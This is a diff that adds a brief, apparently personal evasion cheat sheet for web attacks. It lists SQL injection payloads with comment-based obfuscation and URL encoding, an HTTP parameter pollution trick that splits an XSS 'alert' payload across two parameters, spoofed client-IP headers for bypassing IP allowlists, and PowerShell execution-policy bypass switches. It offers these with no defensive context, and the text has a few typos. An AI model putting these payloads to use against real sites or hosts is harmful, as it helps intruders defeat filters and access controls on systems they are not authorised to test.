@@ -1,0 +1,29 @@
+# SQL
+Evasion tecnniques
+-1' or 1=1 -- +
+  *-1' or 2>1-- +
+-1' /*!12345order*/ by 7#
+
+1' order by 8 -- +
+   urlencoder : 1%27%20order%20by%208%20--%20%2B
+   hex
+------------------------------------------
+
+#hpp waf bypass 
+
+url&s1=muslum&s2=muslum
+url&s1="><img src=ab onerror=al&s2=ert(1)> 
+
+------------------------------------------
+#ip bypass 
+X-Forwarded-For : istenen ip adresi
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+
+------------------------------------
+
+# Windows Bypass powershell
+powershell.exe -exec bypass 
+powsershell.exe -ep bypass -nop
